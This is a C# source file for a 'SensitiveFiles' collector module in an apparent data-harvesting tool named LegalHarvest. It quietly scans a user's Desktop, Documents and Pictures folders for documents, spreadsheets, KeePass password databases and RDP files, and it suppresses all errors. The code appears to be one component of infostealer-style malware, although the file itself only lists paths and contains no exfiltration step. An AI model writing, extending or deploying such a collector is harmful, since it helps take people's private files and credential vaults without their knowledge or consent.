using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace LegalHarvest.Modules
{
    public class SensitiveFilesModule : ICollectorModule
    {
        public string ModuleName => "SensitiveFiles";
        public bool CanExecute() => true;

        private readonly string[] extensions = { ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".kdbx", ".rdp", ".pptx", ".odt", ".ods", ".csv" };
        private const int MaxFileSize = 5 * 1024 * 1024;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string[] dirs = { Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };
            foreach (string dir in dirs)
                if (Directory.Exists(dir)) Scan(dir, items, 0);
            return items;
        }

        private void Scan(string dir, List<CollectedItem> items, int depth)
        {
            if (depth > 3) return;
            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    if (extensions.Contains(Path.GetExtension(file).ToLower()) && new FileInfo(file).Length <= MaxFileSize)
                        items.Add(new CollectedItem { Category = "SensitiveFile", Name = Path.GetFileName(file), Value = file, Timestamp = DateTime.Now });
                }
                foreach (string sub in Directory.GetDirectories(dir)) Scan(sub, items, depth + 1);
            }
            catch { }
        }
    }
}
